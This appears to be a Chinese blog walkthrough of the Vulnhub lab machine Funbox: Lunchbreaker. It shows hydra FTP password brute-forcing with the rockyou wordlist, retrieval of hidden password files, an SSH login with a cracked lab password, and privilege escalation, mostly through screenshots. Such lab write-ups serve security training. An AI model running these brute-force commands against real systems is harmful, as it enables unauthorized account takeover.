---

title: Vulnhub--Funbox:lunchbreaker
categories: [渗透靶场, Vulnhub]

---

## **渗透复现**

1. Web站点无可利用信息，但是疑似用户名泄露
2. 根据拿到的用户名，hydra尝试爆破ftp端口
3. 成功爆出用户密码，进行ftp连接，home目录下发现其他用户
4. 通过信息收集，继续爆破其他用户，最终爆出高权限用户的密码
5. ssh进行远程连接，高权限用户

## **知识扩展**

1. hydra爆破21端口（ftp）
2. ftp连接操作

## 靶机地址

https://www.vulnhub.com/entry/funbox-lunchbreaker,700/

## 主机发现

（1）攻击机

```PY
192.168.88.128
```

（2）目标靶机

```PY
192.168.88.130
```

## 信息收集

### 端口扫描

![image-20240828100057289](https://cdn.jsdelivr.net/gh/Pres3nt/Typoraimages@master/images/202408281000384.png)

![image-20240828100114171](https://cdn.jsdelivr.net/gh/Pres3nt/Typoraimages@master/images/202408281001330.png)

### 目录扫描

![image-20240828100134905](https://cdn.jsdelivr.net/gh/Pres3nt/Typoraimages@master/images/202408281001022.png)

### 目录爆破

![image-20240828100148505](https://cdn.jsdelivr.net/gh/Pres3nt/Typoraimages@master/images/202408281001621.png)

### 目录访问

（1）源代码

![image-20240828100205960](https://cdn.jsdelivr.net/gh/Pres3nt/Typoraimages@master/images/202408281002015.png)

（2）robots.txt

![image-20240828100217257](https://cdn.jsdelivr.net/gh/Pres3nt/Typoraimages@master/images/202408281002304.png)

## 实施攻击

（1）web站点无明显可用信息，疑似泄露用户名，因此大概率需要爆破ftp或者ssh端口

```python
#将其放入txt文件中，使用hydra进行ftp爆破
jane
miller
j.miller
```

![image-20240828100223988](https://cdn.jsdelivr.net/gh/Pres3nt/Typoraimages@master/images/202408281002034.png)

（2）首次使用hydra需要解压字典

```python
sudo apt install wordlists
wordlists -h
kali.org/tools/wordlists/wordlists | Kali Linux Tools
```

![image-20240828100231244](https://cdn.jsdelivr.net/gh/Pres3nt/Typoraimages@master/images/202408281002324.png)

![image-20240828100242053](https://cdn.jsdelivr.net/gh/Pres3nt/Typoraimages@master/images/202408281002172.png)

![image-20240828100256408](https://cdn.jsdelivr.net/gh/Pres3nt/Typoraimages@master/images/202408281002537.png)

（3）尝试爆破21端口（ftp），成功爆出用户jane的密码

```py
#只需要知道用户名即可
hydra -L user.txt -P /usr/share/wordlists/rockyou.txt 192.168.88.130 ftp
```

![image-20240828100304835](https://cdn.jsdelivr.net/gh/Pres3nt/Typoraimages@master/images/202408281003899.png)

（4）ftp端口登录，发现备份文件

```py
#ftp+ip进行ftp登录
ftp 192.168.88.130
```

![image-20240828100320242](https://cdn.jsdelivr.net/gh/Pres3nt/Typoraimages@master/images/202408281003321.png)

（5）jane用户进行信息收集，在其home目录下，发现其他用户

![image-20240828100339380](https://cdn.jsdelivr.net/gh/Pres3nt/Typoraimages@master/images/202408281003525.png)

![image-20240828100348519](https://cdn.jsdelivr.net/gh/Pres3nt/Typoraimages@master/images/202408281003598.png)

![image-20240828100400913](https://cdn.jsdelivr.net/gh/Pres3nt/Typoraimages@master/images/202408281004009.png)

（6）单独爆破其他用户，成功爆出用户jim和jules，john用户爆了很久没爆出来

```py
#爆破单个用户时参数为-l，一次爆破多个用户时使用-L（大小写之区别）
hydra -l jim -P /usr/share/wordlists/rockyou.txt 192.168.88.130 ftp
hydra -l john -P /usr/share/wordlists/rockyou.txt 192.168.88.130 ftp
hydra -l jules -P /usr/share/wordlists/rockyou.txt 192.168.88.130 ftp
```

![image-20240828100417070](https://cdn.jsdelivr.net/gh/Pres3nt/Typoraimages@master/images/202408281004135.png)

![image-20240828100426595](https://cdn.jsdelivr.net/gh/Pres3nt/Typoraimages@master/images/202408281004652.png)

![image-20240828100439545](https://cdn.jsdelivr.net/gh/Pres3nt/Typoraimages@master/images/202408281004614.png)

（7）jim用户登录进行信息收集，.ssh文件夹中内容为空，无可用信息

![image-20240828100448397](https://cdn.jsdelivr.net/gh/Pres3nt/Typoraimages@master/images/202408281004488.png)

![image-20240828100459625](https://cdn.jsdelivr.net/gh/Pres3nt/Typoraimages@master/images/202408281004718.png)

（8）jules用户登录进行信息收集发现备份文件，.bad-passwds和.good-passwd文件可能是密码本

![image-20240828100513155](https://cdn.jsdelivr.net/gh/Pres3nt/Typoraimages@master/images/202408281005248.png)

![image-20240828100524192](https://cdn.jsdelivr.net/gh/Pres3nt/Typoraimages@master/images/202408281005311.png)

![image-20240828100533281](https://cdn.jsdelivr.net/gh/Pres3nt/Typoraimages@master/images/202408281005389.png)

（9）下载两个备份文件到桌面

```py
#隐藏文件，桌面看不见
get .bad-passwds
get .good-passwd
```

![image-20240828100623625](https://cdn.jsdelivr.net/gh/Pres3nt/Typoraimages@master/images/202408281006723.png)

![image-20240828100708337](https://cdn.jsdelivr.net/gh/Pres3nt/Typoraimages@master/images/202408281007385.png)

（10）利用两个备份密码文件继续尝试爆破john用户，.bad-passwds文件成功爆出john用户密码

```py
john
zhnmju!!!
```

![image-20240828100717787](https://cdn.jsdelivr.net/gh/Pres3nt/Typoraimages@master/images/202408281007861.png)

![image-20240828100730116](https://cdn.jsdelivr.net/gh/Pres3nt/Typoraimages@master/images/202408281007174.png)

（11）ssh登录john用户

![image-20240828100739110](https://cdn.jsdelivr.net/gh/Pres3nt/Typoraimages@master/images/202408281007220.png)

## 提权

（1）john用户进行信息收集

![image-20240828100746940](https://cdn.jsdelivr.net/gh/Pres3nt/Typoraimages@master/images/202408281007025.png)

（2）john用户可直接提权

![image-20240828100754495](https://cdn.jsdelivr.net/gh/Pres3nt/Typoraimages@master/images/202408281007608.png)